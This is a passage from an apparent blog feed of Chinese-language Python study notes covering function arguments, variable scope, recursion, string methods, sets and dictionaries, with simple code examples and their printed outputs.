30, 40)<br>fun3(<span class="hljs-attribute">a</span>=11,b=22,c=33,d=44,e=55)#{<span class="hljs-string">'a'</span>: 11, <span class="hljs-string">'b'</span>: 22, <span class="hljs-string">'c'</span>: 33, <span class="hljs-string">'d'</span>: 44, <span class="hljs-string">'e'</span>: 55}<br>def fun4(a,b,c,d):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">'a='</span>,a)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">'b='</span>,b)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">'c='</span>,c)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">'d='</span>,d)<br>fun4(10,20,30,40)#<span class="hljs-attribute">a</span>=10 <span class="hljs-attribute">b</span>=20 <span class="hljs-attribute">c</span>=30 <span class="hljs-attribute">d</span>=40<br>fun4(<span class="hljs-attribute">a</span>=11,b=22,c=33,d=44)#a=11 <span class="hljs-attribute">b</span>=22 <span class="hljs-attribute">c</span>=33 <span class="hljs-attribute">d</span>=44<br>fun4(100,200,<span class="hljs-attribute">c</span>=300,d=400)#a=100 <span class="hljs-attribute">b</span>=200 <span class="hljs-attribute">c</span>=300 <span class="hljs-attribute">d</span>=400<br></code></pre></td></tr></tbody></table></figure><h2 id="变量的作用域"><a href="#变量的作用域" class="headerlink" title="变量的作用域"></a>变量的作用域</h2><p>代码可访问该变量的区域</p><p>有效范围：</p><p>（1）局部变量：global声明可将局部变量转为全局变量；局部变量仅在函数体内部有效</p><p>（2）全局变量：函数体外定义的变量，函数体内外都可调用</p><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs routeros">def fun(a,b):<br>    <span class="hljs-attribute">c</span>=a+b #c为局部变量<br>    <span class="hljs-built_in">print</span>(c)<br><span class="hljs-attribute">name</span>=<span class="hljs-string">'张三'</span>#name为全局变量<br><span class="hljs-built_in">print</span>(name)<br>def fun1():<br>    <span class="hljs-built_in">print</span>(name)<br>fun1()#张三<br>def fun2():<br>    global age<br>    <span class="hljs-attribute">age</span>=20<br>    <span class="hljs-built_in">print</span>(age)<br>fun2()<br><span class="hljs-built_in">print</span>(age)<br></code></pre></td></tr></tbody></table></figure><h2 id="递归函数"><a href="#递归函数" class="headerlink" title="递归函数"></a>递归函数</h2><p>（1）一个函数在函数体内调用本身，即为递归</p><p>（2）组成：递归调用与终止条件</p><p>（3）每递归调用一次，就在栈内分配一个战阵，执行完之后再释放</p><p>（4）优点：思路代码简单；缺点：占用内存多，效率低</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">fac</span>(<span class="hljs-params">n</span>):<br>    <span class="hljs-keyword">if</span> n==<span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> n*fac(n-<span class="hljs-number">1</span>)<br><span class="hljs-built_in">print</span>(fac(<span class="hljs-number">6</span>))<span class="hljs-comment">#720</span><br></code></pre></td></tr></tbody></table></figure><p>斐波那契数列：</p><figure class="highlight apache"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">def</span> fib(n):<br>    <span class="hljs-attribute">if</span> n==<span class="hljs-number">1</span>:<br>        <span class="hljs-attribute">return</span> <span class="hljs-number">1</span><br>    <span class="hljs-attribute">elif</span> n==<span class="hljs-number">2</span>:<br>        <span class="hljs-attribute">return</span> <span class="hljs-number">1</span><br>    <span class="hljs-attribute">else</span>:<br>        <span class="hljs-attribute">return</span> fib(n-<span class="hljs-number">1</span>)+fib(n-<span class="hljs-number">2</span>)<br><span class="hljs-attribute">print</span>(fib(<span class="hljs-number">8</span>))#<span class="hljs-number">21</span><br> <span class="hljs-comment">#输出前六位</span><br><span class="hljs-attribute">for</span> i in range(<span class="hljs-number">1</span>,<span class="hljs-number">7</span>):<br>    <span class="hljs-attribute">print</span>(fib(i))#<span class="hljs-number">1</span> <span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">5</span> <span class="hljs-number">8</span><br></code></pre></td></tr></tbody></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;字符串&quot;&gt;&lt;a href=&quot;#字符串&quot; class=&quot;headerlink&quot; title=&quot;字符串&quot;&gt;&lt;/a&gt;字符串&lt;/h1&gt;&lt;p&gt;python基本数据类型，不可变字符序列&lt;/p&gt;
&lt;h2 id=&quot;驻留机制&quot;&gt;&lt;a href=&quot;#驻留机制&quot; class=&quot;head</summary>
      
    
    
    
    
    <category term="python" scheme="https://sinky.top/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>python学习随笔记录</title>
    <link href="https://sinky.top/2022/09/11/python%E9%9A%8F%E7%AC%94%E8%AE%B0%E5%BD%95/"/>
    <id>https://sinky.top/2022/09/11/python%E9%9A%8F%E7%AC%94%E8%AE%B0%E5%BD%95/</id>
    <published>2022-09-11T03:14:15.901Z</published>
    <updated>2022-09-14T14:58:43.042Z</updated>
    
    <content type="html"><![CDATA[<ul><li>strip() 删除两边空格</li><li>lstrip() 删除左边空格</li><li>rstrip() 删除右边空格</li><li>replace(“ “,””) 删除所有空格</li><li>split() 先切分</li><li>join() 再拼接</li></ul><h1 id="1"><a href="#1" class="headerlink" title="1"></a>1</h1><p>描述</p><p>一串连续的数据用什么记录最合适，牛牛认为在Python中非列表（list）莫属了。现输入牛牛朋友们的名字，请使用list函数与split函数将它们封装成列表，再整个输出列表。</p><p>输入描述：</p><p>输入一串字符串，它们之间通过空格间隔开。</p><p>输出描述：</p><p>输出封装后的列表。</p><p>示例1</p><p>输入：<code>NiuNiu NiuMei NiuNeng</code></p><p>输出：<code>['NiuNiu', 'NiuMei', 'NiuNeng']</code></p><p>解：</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">name=<span class="hljs-selector-tag">input</span>()<span class="hljs-selector-class">.split</span>(<span class="hljs-string">" "</span>)<br>name_list=<span class="hljs-built_in">list</span>()<br><span class="hljs-keyword">for</span> <span class="hljs-selector-tag">i</span> <span class="hljs-keyword">in</span> name:<br>    name_list<span class="hljs-selector-class">.append</span>(i)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(name_list)</span></span><br></code></pre></td></tr></tbody></table></figure><h1 id="2"><a href="#2" class="headerlink" title="2"></a>2</h1><ul><li>bin(x) 转二进制</li><li>hex(x) 转十六进制</li><li>ord(x) 字母转数字</li><li>abs(x) 转绝对值</li><li>sum(x) 算数和</li><li>max(x) 最大值</li><li>min(x) 最小值</li><li>count() 计数</li><li>pow() 幂乘 x**y=pow(x,y)</li><li>x.isalpha() 判断字符串中是否只包含字母</li><li>x.isdigit() 判断字符串中是否只包含数字</li><li>x.isspace() 判断字符串中是否只包含空格</li><li>find() 查找字符串</li><li>round(f,n) 输出f四舍五入保留至n位小数后的结果</li><li>eval() 公式计算器</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;ul&gt;
&lt;li&gt;strip() 删除两边空格&lt;/li&gt;
&lt;li&gt;lstrip() 删除左边空格&lt;/li&gt;
&lt;li&gt;rstrip() 删除右边空格&lt;/li&gt;
&lt;li&gt;replace(“ “,””) 删除所有空格&lt;/li&gt;
&lt;li&gt;split() 先切分&lt;/li&gt;
&lt;li&gt;join</summary>
      
    
    
    
    
    <category term="python" scheme="https://sinky.top/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>Python学习5</title>
    <link href="https://sinky.top/2022/09/06/python%E5%AD%A6%E4%B9%A05/"/>
    <id>https://sinky.top/2022/09/06/python%E5%AD%A6%E4%B9%A05/</id>
    <published>2022-09-06T08:43:42.900Z</published>
    <updated>2022-09-06T10:08:01.922Z</updated>
    
    <content type="html"><![CDATA[<h1 id="集合"><a href="#集合" class="headerlink" title="集合"></a>集合</h1><p>python内置数据结构，可变序列，无value的字典。</p><h2 id="创建："><a href="#创建：" class="headerlink" title="创建： {}"></a>创建： {}</h2><ul><li><code>s={'Python','world',90}</code></li><li>set() : <code>s=set(range(6))</code></li></ul><figure class="highlight apache"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">s</span>={<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">7</span>}<br><span class="hljs-attribute">print</span>(s) #{<span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>}<br></code></pre></td></tr></tbody></table></figure><p>eg: </p><figure class="highlight angelscript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">s1=<span class="hljs-keyword">set</span>(range(<span class="hljs-number">6</span>))<br>print(s,type(s)) #{<span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>} &lt;<span class="hljs-keyword">class</span> '<span class="hljs-symbol">set</span>'&gt;<br><span class="hljs-symbol">s3</span>=<span class="hljs-symbol">set</span>((<span class="hljs-symbol">1,<span class="hljs-symbol">2</span>,<span class="hljs-symbol">4</span>,<span class="hljs-symbol">4</span>,<span class="hljs-symbol">5</span>,<span class="hljs-symbol">65</span></span>))<br><span class="hljs-symbol">print</span>(<span class="hljs-symbol">s3,<span class="hljs-symbol">type</span></span>(<span class="hljs-symbol">s3</span>)) #{<span class="hljs-number">65</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>} &lt;<span class="hljs-keyword">class</span> '<span class="hljs-symbol">set</span>'&gt;<br> #集合中元素无序<br><span class="hljs-symbol">s4</span>=<span class="hljs-symbol">set</span>('<span class="hljs-symbol">python</span>')<br><span class="hljs-symbol">print</span>(<span class="hljs-symbol">s4,<span class="hljs-symbol">type</span></span>(<span class="hljs-symbol">s4</span>)) #{<span class="hljs-string">'o'</span>, <span class="hljs-string">'n'</span>, <span class="hljs-string">'y'</span>, <span class="hljs-string">'t'</span>, <span class="hljs-string">'h'</span>, <span class="hljs-string">'p'</span>} &lt;<span class="hljs-keyword">class</span> '<span class="hljs-symbol">set</span>'&gt;<br><span class="hljs-symbol">s5</span>=<span class="hljs-symbol">set</span>({<span class="hljs-number">12</span>,<span class="hljs-number">4</span>,<span class="hljs-number">33</span>,<span class="hljs-number">25</span>,<span class="hljs-number">24</span>,<span class="hljs-number">23</span>})<br>print(s5,type(s5)) #{<span class="hljs-number">33</span>, <span class="hljs-number">4</span>, <span class="hljs-number">23</span>, <span class="hljs-number">24</span>, <span class="hljs-number">25</span>, <span class="hljs-number">12</span>} &lt;<span class="hljs-keyword">class</span> '<span class="hljs-symbol">set</span>'&gt;<br> #空集合<br><span class="hljs-symbol">s6</span>={} #字典类型<br>print(type(s6)) #&lt;<span class="hljs-keyword">class</span> '<span class="hljs-symbol">dict</span>'&gt;<br><span class="hljs-symbol">s7</span>=<span class="hljs-symbol">set</span>()<br><span class="hljs-symbol">print</span>(<span class="hljs-symbol">s7,<span class="hljs-symbol">type</span></span>(<span class="hljs-symbol">s7</span>)) #<span class="hljs-symbol">set</span>() &lt;<span class="hljs-symbol">class</span> '<span class="hljs-symbol">set</span>'&gt;<br></code></pre></td></tr></tbody></table></figure><h2 id="相关操作"><a href="#相关操作" class="headerlink" title="相关操作"></a>相关操作</h2><p>（1）判断： in 或 not in</p><p>（2）新增：</p><ul><li>add() : 一次添加一个元素</li><li>update() : 至少添加一个元素</li></ul><p>（3）删除：</p><ul><li>remove() : 一次删除一个指定元素，指定元素不存在抛出keyerror</li><li>discard(): 一次删除一个注定元素，指定元素不存在不抛出异常</li><li>pop(): 一次随机删除一个任意元素</li><li>clear(): 清空</li></ul><figure class="highlight apache"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">s</span>={<span class="hljs-number">1</span>,<span class="hljs-number">3</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">4</span>} <br><span class="hljs-attribute">print</span>(<span class="hljs-number">1</span> in s) #True<br><span class="hljs-attribute">print</span>(<span class="hljs-number">1</span> not in s) #False<br><span class="hljs-attribute">s</span>.add(<span class="hljs-number">80</span>)<br><span class="hljs-attribute">print</span>(s) #{<span class="hljs-number">80</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>}<br><span class="hljs-attribute">s</span>.update({<span class="hljs-number">100</span>,<span class="hljs-number">200</span>,<span class="hljs-number">300</span>})<br><span class="hljs-attribute">print</span>(s) #{<span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">100</span>, <span class="hljs-number">200</span>, <span class="hljs-number">300</span>, <span class="hljs-number">80</span>}<br><span class="hljs-attribute">s</span>.update([<span class="hljs-number">100</span>,<span class="hljs-number">98</span>,<span class="hljs-number">89</span>])<br><span class="hljs-attribute">print</span>(s) #{<span class="hljs-number">1</span>, <span class="hljs-number">98</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">100</span>, <span class="hljs-number">200</span>, <span class="hljs-number">300</span>, <span class="hljs-number">80</span>, <span class="hljs-number">89</span>}<br><span class="hljs-attribute">s</span>.update([<span class="hljs-number">78</span>,<span class="hljs-number">64</span>,<span class="hljs-number">56</span>])<br><span class="hljs-attribute">print</span>(s)  #{<span class="hljs-number">64</span>, <span class="hljs-number">1</span>, <span class="hljs-number">98</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">100</span>, <span class="hljs-number">200</span>, <span class="hljs-number">300</span>, <span class="hljs-number">78</span>, <span class="hljs-number">80</span>, <span class="hljs-number">56</span>, <span class="hljs-number">89</span>} <br><span class="hljs-attribute">s</span>.remove(<span class="hljs-number">100</span>)<br><span class="hljs-attribute">print</span>(s) #{<span class="hljs-number">64</span>, <span class="hljs-number">1</span>, <span class="hljs-number">98</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">200</span>, <span class="hljs-number">300</span>, <span class="hljs-number">78</span>, <span class="hljs-number">80</span>, <span class="hljs-number">56</span>, <span class="hljs-number">89</span>}<br><span class="hljs-attribute">s</span>.discard(<span class="hljs-number">500</span>)<br><span class="hljs-attribute">print</span>(s) #{<span class="hljs-number">64</span>, <span class="hljs-number">1</span>, <span class="hljs-number">98</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">200</span>, <span class="hljs-number">300</span>, <span class="hljs-number">78</span>, <span class="hljs-number">80</span>, <span class="hljs-number">56</span>, <span class="hljs-number">89</span>}<br><span class="hljs-attribute">s</span>.discard(<span class="hljs-number">300</span>)<br><span class="hljs-attribute">print</span>(s) #{<span class="hljs-number">64</span>, <span class="hljs-number">1</span>, <span class="hljs-number">98</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">200</span>, <span class="hljs-number">78</span>, <span class="hljs-number">80</span>, <span class="hljs-number">56</span>, <span class="hljs-number">89</span>}<br><span class="hljs-attribute">s</span>.pop()<br><span class="hljs-attribute">print</span>(s) #{<span class="hljs-number">1</span>, <span class="hljs-number">98</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">200</span>, <span class="hljs-number">78</span>, <span class="hljs-number">80</span>, <span class="hljs-number">56</span>, <span class="hljs-number">89</span>}<br><span class="hljs-attribute">s</span>.clear()<br><span class="hljs-attribute">print</span>(s) #set()<br></code></pre></td></tr></tbody></table></figure><h2 id="集合间的关系"><a href="#集合间的关系" class="headerlink" title="集合间的关系"></a>集合间的关系</h2><ul><li>是否相等： == 或 !=</li><li>一个集合是否为另一集合的子集： issubset<ul><li>b是a的子集</li></ul></li><li>一个集合是否为另一集合的超集： issuperset<ul><li>a是b的超集</li></ul></li><li>两集合是否无交集： isdisjoint</li></ul><figure class="highlight apache"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">s</span>={<span class="hljs-number">10</span>,<span class="hljs-number">20</span>,<span class="hljs-number">30</span>,<span class="hljs-number">40</span>}<br><span class="hljs-attribute">s2</span>={<span class="hljs-number">30</span>,<span class="hljs-number">40</span>,<span class="hljs-number">20</span>,<span class="hljs-number">10</span>}<br><span class="hljs-attribute">print</span>(s==s2) #True<br><span class="hljs-attribute">print</span>(s!=s2) #False<br></code></pre></td></tr></tbody></table></figure><p>eg:</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs stylus">s1={<span class="hljs-number">10</span>,<span class="hljs-number">20</span>,<span class="hljs-number">30</span>,<span class="hljs-number">40</span>,<span class="hljs-number">50</span>,<span class="hljs-number">60</span>}<br>s2={<span class="hljs-number">10</span>,<span class="hljs-number">20</span>,<span class="hljs-number">30</span>,<span class="hljs-number">40</span>}<br>s3={<span class="hljs-number">10</span>,<span class="hljs-number">20</span>,<span class="hljs-number">90</span>}<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(s2.issubset(s1)</span></span>)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(s3.issubset(s2)</span></span>)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(s1.issuperset(s2)</span></span>)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(s1.issuperset(s3)</span></span>)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(s2.isdisjoint(s3)</span></span>)<br>s4={<span class="hljs-number">100</span>,<span class="hljs-number">200</span>,<span class="hljs-number">300</span>}<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(s2.isdisjoint(s4)</span></span>)<br> <span class="hljs-selector-id">#True</span><br> <span class="hljs-selector-id">#False</span><br> <span class="hljs-selector-id">#True</span><br> <span class="hljs-selector-id">#False</span><br> <span class="hljs-selector-id">#False</span><br> #True<br></code></pre></td></tr></tbody></table></figure><h2 id="集合的数学操作"><a href="#集合的数学操作" class="headerlink" title="集合的数学操作"></a>集合的数学操作</h2><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs stylus">s1={<span class="hljs-number">10</span>,<span class="hljs-number">20</span>,<span class="hljs-number">30</span>,<span class="hljs-number">40</span>}<br>s2={<span class="hljs-number">20</span>,<span class="hljs-number">30</span>,<span class="hljs-number">40</span>,<span class="hljs-number">50</span>,<span class="hljs-number">60</span>}<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(s1.intersection(s2)</span></span>)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(s1 &amp; s2)</span></span> #{<span class="hljs-number">40</span>, <span class="hljs-number">20</span>, <span class="hljs-number">30</span>}<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(s1.union(s2)</span></span>)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(s1 | s2)</span></span> #{<span class="hljs-number">40</span>, <span class="hljs-number">10</span>, <span class="hljs-number">50</span>, <span class="hljs-number">20</span>, <span class="hljs-number">60</span>, <span class="hljs-number">30</span>}<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(s1.difference(s2)</span></span>)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(s1-s2)</span></span> #{<span class="hljs-number">10</span>}<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(s1.symmetric_difference(s2)</span></span>)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(s1^s2)</span></span> #{<span class="hljs-number">50</span>, <span class="hljs-number">10</span>, <span class="hljs-number">60</span>}<br></code></pre></td></tr></tbody></table></figure><h2 id="集合生成式"><a href="#集合生成式" class="headerlink" title="集合生成式"></a>集合生成式</h2><figure class="highlight apache"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">lst</span>=[i*i for i in range(<span class="hljs-number">6</span>)]<br><span class="hljs-attribute">print</span>(lst) #[<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>, <span class="hljs-number">9</span>, <span class="hljs-number">16</span>, <span class="hljs-number">25</span>]<br><span class="hljs-attribute">s</span>={i*i for i in range(<span class="hljs-number">6</span>)}<br><span class="hljs-attribute">print</span>(s) #{<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>, <span class="hljs-number">9</span>, <span class="hljs-number">16</span>, <span class="hljs-number">25</span>}<br></code></pre></td></tr></tbody></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;集合&quot;&gt;&lt;a href=&quot;#集合&quot; class=&quot;headerlink&quot; title=&quot;集合&quot;&gt;&lt;/a&gt;集合&lt;/h1&gt;&lt;p&gt;python内置数据结构，可变序列，无value的字典。&lt;/p&gt;
&lt;h2 id=&quot;创建：&quot;&gt;&lt;a href=&quot;#创建：&quot; class=&quot;he</summary>
      
    
    
    
    
    <category term="python" scheme="https://sinky.top/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>Python学习4</title>
    <link href="https://sinky.top/2022/09/05/python%E5%AD%A6%E4%B9%A04/"/>
    <id>https://sinky.top/2022/09/05/python%E5%AD%A6%E4%B9%A04/</id>
    <published>2022-09-05T09:05:23.791Z</published>
    <updated>2022-09-05T11:20:04.588Z</updated>
    
    <content type="html"><![CDATA[<p>(啊，最近找工作找的心烦意乱，心浮气躁，都没办法静下心学习了，摆烂了好几天之后深觉不应该如此，无论找工作怎么样子，每天的学习也不应该中断)</p><h1 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h1><p>列表： []</p><p>字典： {} 可变序列，以键值对方式存储数据</p><p>根据key查找value所在位置。</p><h2 id="创建"><a href="#创建" class="headerlink" title="创建"></a>创建</h2><pre><code class="hljs">score={'张三':100,'李四':98,'王五':45}内置函数dict(name='jack',age=20)</code></pre><p>eg:</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stylus">score={<span class="hljs-string">'张三'</span>:<span class="hljs-number">100</span>,<span class="hljs-string">'李四'</span>:<span class="hljs-number">98</span>,<span class="hljs-string">'王五'</span>:<span class="hljs-number">45</span>}<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(score)</span></span> #{<span class="hljs-string">'张三'</span>: <span class="hljs-number">100</span>, <span class="hljs-string">'李四'</span>: <span class="hljs-number">98</span>, <span class="hljs-string">'王五'</span>: <span class="hljs-number">45</span>}<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(type(score)</span></span>) #&lt;class <span class="hljs-string">'dict'</span>&gt;<br>s=<span class="hljs-built_in">dict</span>(name=<span class="hljs-string">'jack'</span>,age=<span class="hljs-number">20</span>)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(s)</span></span> #{<span class="hljs-string">'name'</span>: <span class="hljs-string">'jack'</span>, <span class="hljs-string">'age'</span>: <span class="hljs-number">20</span>}<br>d={}<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(d)</span></span> #{}<br></code></pre></td></tr></tbody></table></figure><h2 id="元素获取"><a href="#元素获取" class="headerlink" title="元素获取"></a>元素获取</h2><ul><li>[]: score[‘张三’] <ul><li>若字典中不存在指定key,则抛出keyerror</li></ul></li><li>get(): score.get(‘张三’)<ul><li>若不存在key，则返回None</li></ul></li></ul><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">score={<span class="hljs-string">'张三'</span>:<span class="hljs-number">100</span>,<span class="hljs-string">'李四'</span>:<span class="hljs-number">98</span>,<span class="hljs-string">'王五'</span>:<span class="hljs-number">45</span>}<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(score[<span class="hljs-string">'张三'</span>])</span></span> <span class="hljs-number">#100</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(score.get(<span class="hljs-string">'张三'</span>)</span></span>) <span class="hljs-number">#100</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(score.get(<span class="hljs-string">'陈六'</span>)</span></span>) <span class="hljs-selector-id">#None</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(score.get(<span class="hljs-string">'嘛七'</span>,<span class="hljs-number">99</span>)</span></span>) #<span class="hljs-number">99</span> #<span class="hljs-number">99</span>是嘛七所对value不存在时提供的默认值<br></code></pre></td></tr></tbody></table></figure><h2 id="常用操作"><a href="#常用操作" class="headerlink" title="常用操作"></a>常用操作</h2><h3 id="key的判断"><a href="#key的判断" class="headerlink" title="key的判断"></a>key的判断</h3><ul><li>in : key在字典中返回True</li><li>not in : key不在字典中返回True</li></ul><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">score={<span class="hljs-string">'张三'</span>:<span class="hljs-number">100</span>,<span class="hljs-string">'李四'</span>:<span class="hljs-number">98</span>,<span class="hljs-string">'王五'</span>:<span class="hljs-number">45</span>}<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-string">'张三'</span> in score)</span></span> <span class="hljs-selector-id">#True</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-string">'张三'</span> not in score)</span></span> #False<br></code></pre></td></tr></tbody></table></figure><h3 id="元素删除"><a href="#元素删除" class="headerlink" title="元素删除"></a>元素删除</h3><pre><code class="hljs">del score['张三']print(score) #{'李四': 98, '王五': 45}score.clear() #清空字典print(score) #{}</code></pre><h3 id="元素新增"><a href="#元素新增" class="headerlink" title="元素新增"></a>元素新增</h3><pre><code class="hljs">score['陈六']=98print(score) #{'李四': 98, '王五': 45, '陈六': 98}</code></pre><h3 id="元素修改"><a href="#元素修改" class="headerlink" title="元素修改"></a>元素修改</h3><pre><code class="hljs">score['陈六']=1001print(score) #{'李四': 98, '王五': 45, '陈六': 1001}</code></pre><h3 id="获取字典视图的三个方法"><a href="#获取字典视图的三个方法" class="headerlink" 